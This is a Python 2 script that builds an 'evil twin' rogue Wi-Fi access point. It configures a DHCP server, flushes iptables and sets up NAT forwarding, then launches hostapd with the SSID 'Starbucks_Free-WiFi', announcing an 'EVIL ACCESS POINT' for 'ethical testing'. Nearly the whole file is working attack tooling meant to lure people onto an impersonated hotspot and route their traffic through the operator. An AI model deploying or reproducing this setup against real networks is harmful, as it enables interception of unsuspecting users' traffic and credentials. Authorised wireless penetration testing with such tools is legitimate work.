#!/usr/sbin/env python

import subprocess
import sys
import time
import re
print(sys.argv)

##Global params

i=0
ii=0
int=0
f=0
WLAN=""
WLANMON=""
dhcp="dhcpd"


##Checking if required programs, files and paths are correct
print "INFO> Checkin programs, files and path\n" 

##Check iw       
cmd=("which iw")
output = subprocess.call(cmd, shell=True)

if output==0:  
   print "   [1] iw               Yes"
   f=1 
else:
   print "   [1] iw               No"
   f=0
time.sleep(1)
##End iw check

#Check hostapd 
cmd=("which hostapd")
output = subprocess.call(cmd, shell=True)

if output==0:  
   print "   [2] hostapd          Yes"
   f=1 
else:
   print "   [2] hostapd          No"
   f=0
time.sleep(1)
##End hostapd check

#Check dhcpd  
cmd=("which dhcpd")
output = subprocess.call(cmd, shell=True)

if output==0:  
   print "   [3] dhcpd            Yes"
   f=1 
else:
   print "   [3] dhcpd            No"
   f=0
time.sleep(1)
##End dhcpd 

print"\nINFO> Finished program check\n"


###CHECKING INTERFACE ATHEROS driver chip set

print"INFO> Checking Interface Atheros\n"

#defined variables

command = 'airmon-ng'
def run_command(command):
   p=subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
   return iter(p.stdout.readline, b'')
for line in run_command(command):
   line = line.strip()  

   m = re.search(r"\b(\w\w\w\w0)\s+Atheros\s+AR9271" , line)
   mm = re.search(r"\b(\w\w\w\w1)\s+Atheros\s+AR9271" , line)
   if m: 
      print "\n   IDENT> interface ath9k found wlan0", m.groups()
      print "\nINFO> interface found wlan0", m.groups()
      WLAN="wlan0"
      WLANMON="wlan0mon"
      break
   elif mm: 
      print "\n   IDENT> interface ath9k interface drive", mm.groups()
      print "\nINFO> monitor mode interface found wlan0", mm.groups()
      WLAN="wlan1"
      WLANMON="wlan1mon"
      break
   else:
      i += 1 
      print "\n   FAIL> No mach wlan1 trys->", i
      print"\n\nINFO> ath9k interface is = ", WLAN 

##END CHECKING INTERFACE ATHEROS

###SET INTERFACE IP ADDRESS 192.168.3.1

print"\nINFO> Configuring interface -> %s IP Address\n" %WLAN

cmd = "ifconfig %s 192.168.3.1 up" %WLAN
int = subprocess.call(cmd, shell=True)        #true is 0 

command = "ifconfig -a %s" %WLAN
output = subprocess.call(command, shell=True) 

##DONE SET INTERFACE IP ADDRESS

###OPEN DHCPD.CONF and ADD CONFGURATION

print"\n   TASK> Creating dhcpd.conf file\n"

with open("/etc/dhcp/dhcpd.conf", "w") as f:
   f.write("ddns-update-style interim;\nignore client-updates;\nauthoritative;\nsubnet 192.168.3.0 netmask 255.255.255.0 {\nrange 192.168.3.100 192.168.3.254;\noption subnet-mask 255.255.255.0;\noption broadcast-address 192.168.3.255;\noption routers 192.168.3.1;\noption domain-name-servers 192.168.3.1, 8.8.8.8, 8.8.4.4;\ndefault-lease-time 21600;\nmax-lease-time 43200;\n}\nlog-facility local7;")

print"INFO> contents of dhcpd.conf\n"
time.sleep(2)
with open("/etc/dhcp/dhcpd.conf", "r") as f:
   print(f.read())

print"\nINFO> dhcpd.conf file creation complete\n"

##DONE Creaing dhcpd.conf file

###START THE DHCPD PROCESS AND FORCE USE wlan1

print"   TASK> check to see if dhcpd is running and get PID"

command = "ps o uid=,pid=,cmd= -C dhcpd"

pid=""
p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
text = p.stdout.read()
retcode = p.wait() 
print text 

m = re.search(r"\b(\d+)\s+dhcpd\s+wlan\d" , text)
if m: 
   print "\nINFO> dhcpd is running PID = ", m.group(1)
   pid=m.group(1)
   print"   TASK> kill PID -> %s" %pid
   command = "kill %s" %pid
   output = subprocess.call(command, shell=True)
else:
   print "\n   INFO> No match for dhcpd PID"

print"\n   TASK> starting dhcpd %s \n" %WLAN

command = "dhcpd wlan1"
output = subprocess.call(command, shell=True)

print"\nINFO> checking dhcpd wlan1 process\n"

command = "ps -aux |grep dhcpd*"
output = subprocess.call(command, shell=True)

print"OUTPUT", output

##END STARTGING DHCPD WLAN1

###IPTABLES SET ROUTING WLAN1 to WLAN0 INTERNET

print"INFO> IPTABLES TIME"

command = "iptables --flush"
output = subprocess.call(command, shell=True)
print output

command = "iptables --table nat --append POSTROUTING --out wlan0 -j MASQUERADE"
output = subprocess.call(command, shell=True)
print output

command = "iptables --append FORWARD --in-interface wlan1 -j ACCEPT"
output = subprocess.call(command, shell=True)
print output

command = "sysctl -w net.ipv4.ip_forward=1"
output = subprocess.call(command, shell=True)
print output

##FINISHED WITH IPTABLES

###HOSTAPD SETUP TIME

print"   TASK> Creating WPA2 file"

command = "touch /etc/hostapd/hostapd-wpa2.conf"
output = subprocess.call(command, shell=True)
print output

with open("/etc/hostapd/hostapd-wpa2.conf", "w") as f:
   f.write("interface=wlan1\nssid=Starbucks_Free-WiFi\nchannel=6\nhw_mode=g\nwpa=2\nwpa_passphrase=password123\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP")

print"INFO> contents of hostapd file\n"
time.sleep(2)
with open ("/etc/hostapd/hostapd-wpa2.conf", "r") as f:
   print(f.read())

print"\nINFO> hostapd-wpa2 file complete\n"

print"\n   TASK> starting hostapd-wpa2 Evil Access Point"

command = "hostapd /etc/hostapd/hostapd-wpa2.conf"
output = subprocess.call(command, shell=True)

print"\n---->  EVIL ACCESS POINT IS UP AND RUNNING for ethical testing\n" 


### END Script 
